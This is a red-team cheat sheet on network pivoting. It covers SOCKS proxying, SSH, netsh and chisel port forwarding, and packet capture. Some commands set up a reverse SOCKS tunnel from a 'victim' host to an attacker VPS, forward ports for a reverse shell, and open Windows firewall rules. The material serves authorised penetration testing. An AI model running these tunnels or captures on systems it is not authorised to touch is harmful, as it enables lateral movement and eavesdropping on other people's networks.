# Network Pivoting Techniques

## SOCKS Proxy

### SOCKS Compatibility Table

| SOCKS Version | TCP   | UDP   | IPv4  | IPv6  | Hostname |
| ------------- | :---: | :---: | :---: | :---: | :---:    |
| SOCKS v4      | ✅    | ❌    | ✅    | ❌    | ❌       |
| SOCKS v4a     | ✅    | ❌    | ✅    | ❌    | ✅       |
| SOCKS v5      | ✅    | ✅    | ✅    | ✅    | ✅       |

### SOCKS Proxy Usage

#### Proxychains

* [rofl0r/proxychains-ng](https://github.com/rofl0r/proxychains-ng) - a preloader which hooks calls to sockets in dynamically linked programs and redirects it through one or more socks/http proxies. continuation of the unmaintained proxychains project.
* [haad/proxychains](https://github.com/haad/proxychains) - a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy. Supported auth-types: "user/pass" for SOCKS4/5, "basic" for HTTP.

Edit the **configuration file** `/etc/proxychains.conf` to add the SOCKS proxies.

```bash
[ProxyList]
# socks4 localhost 8080
socks5 localhost 8081
```

Uncomment `proxy_dns` to also proxify DNS requests.

```ps1
proxychains nmap -sT 10.10.10.10
proxychains curl http://10.10.10.10
```

#### Proxifier

Proxifier allows network applications that do not support working through proxy servers to operate through a SOCKS or HTTPS proxy and chains.

* [proxifier](https://www.proxifier.com/) - The Most Advanced Proxy Client

Open Proxifier, go to **Profile** -> **Proxy Servers** and **Add a new proxy entry**, which will point at the IP address and Port of your SOCKS proxy.

Go to **Profile** -> **Proxification Rules**. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule.

#### Graftcp

* [hmgle/graftcp](https://github.com/hmgle/graftcp) - A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy.

:warning: Same as proxychains, with another mechanism to "proxify" which allow Go applications.

```ps1
# Create a SOCKS5, using Chisel or another tool and forward it through SSH
(attacker) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS
(vps) $ ./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse 
(victim 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks 

# Run graftcp and specify the SOCKS5
(attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080
(attacker) $ graftcp ./nuclei -u http://10.10.10.10
```

Simple configuration file for graftcp: [example-graftcp-local.conf](https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf)

```py
## Listen address (default ":2233")
listen = :2233
loglevel = 1

## SOCKS5 address (default "127.0.0.1:1080")
socks5 = 127.0.0.1:1080
# socks5_username = SOCKS5USERNAME
# socks5_password = SOCKS5PASSWORD

## Set the mode for select a proxy (default "auto")
select_proxy_mode = auto
```

## Port Forwarding

### SSH (native)

| Pivoting Technique     | Command |
| ---------------------- | ------- |
| Local Port Forwarding  | `ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]` |
| Remote Port Forwarding | `ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]` |
| Socks Proxy            | `ssh -N -f -D listenport [user]@[host]` |

Inside an already established SSH session, press `~C` to opens an interactive mode to add local (-L), remote (-R), or dynamic (-D) port forwards. `-D` currently cannot be added after connection. Only `-L` or `-R` work reliably. Dynamic forwarding inside an existing session is not supported by OpenSSH.

```ps1
~C
-L 1080:127.0.0.1:1080
```

### Netsh (native)

```powershell
netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110
```

```powershell
# Forward the port 4545 for the reverse shell, and the 80 for the http server for example
netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545
netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80
```

```powershell
# Correctly open the port on the machine
netsh advfirewall firewall add rule name="PortForwarding 80" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 80" dir=out action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=in action=allow protocol=TCP localport=4545
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=out action=allow protocol=TCP localport=4545
```

1. listenaddress – is a local IP address waiting for a connection.
2. listenport – local listening TCP port (the connection is waited on it).
3. connectaddress – is a local or remote IP address (or DNS name) to which the incoming connection will be redirected.
4. connectport – is a TCP port to which the connection from listenport is forwarded to.

### Custom Tools

* [jpillora/chisel](https://github.com/jpillora/chisel)
* [ginuerzh/gost](https://github.com/ginuerzh/gost)

    ```ps1
    gost -L=tcp://:2222/192.168.1.1:22 [-F=..]
    ```

* [PuTTY/plink](https://putty.org/index.html)

    ```powershell
    plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
    plink -l root -pw toor -R 445:127.0.0.1:445 
    ```

## Network Capture

### TCPDump

* [the-tcpdump-group/tcpdump](https://github.com/the-tcpdump-group/tcpdump)

```ps1
# capture and save the output inside 0001.pcap
tcpdump -w 0001.pcap -i eth0

# capture and display packet in ASCII
tcpdump -A -i eth0

# capture every TCP packet on interface eth0
tcpdump -i eth0 tcp

# capture everything on port 22
tcpdump -i eth0 port 22
```

### Netsh

* Start a capture use the netsh command.

    ```ps1
    netsh trace start capture=yes report=disabled tracefile=c:\trace.etl maxsize=16384
    ```

* Stop the trace

    ```ps1
    netsh trace stop
    ```

* Event tracing

    ```ps1
    netsh trace start capture=yes report=disabled persistent=yes tracefile=c:\trace.etl maxsize=16384
    etl2pcapng.exe c:\trace.etl c:\trace.pcapng
    ```

* Use filters

    ```ps1
    netsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\trace.etl maxsize=16384
    ```

## References

* [A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)
* [Etat de l’art du pivoting réseau en 2019 - Oct 28,2019 - Alexandre ZANNI](https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/)
* [GO Simple Tunnel - Documentation](https://gost.run/en/)
* [Ligolo-ng - Documentation](https://docs.ligolo.ng/)
* [Overview of network pivoting and tunneling [2022 updated] - Alexandre ZANNI](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)
* [Port Forwarding in Windows - Windows OS Hub](http://woshub.com/port-forwarding-in-windows/)
* [Using the SSH "Konami Code" (SSH Control Sequences) - Jeff McJunkin - November 10, 2015](https://web.archive.org/web/20151205120607/https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)
* [Windows: Capture a network trace with builtin tools (netsh) - Michael Albert - February 22, 2021](https://michlstechblog.info/blog/windows-capture-a-network-trace-with-builtin-tools-netsh/)
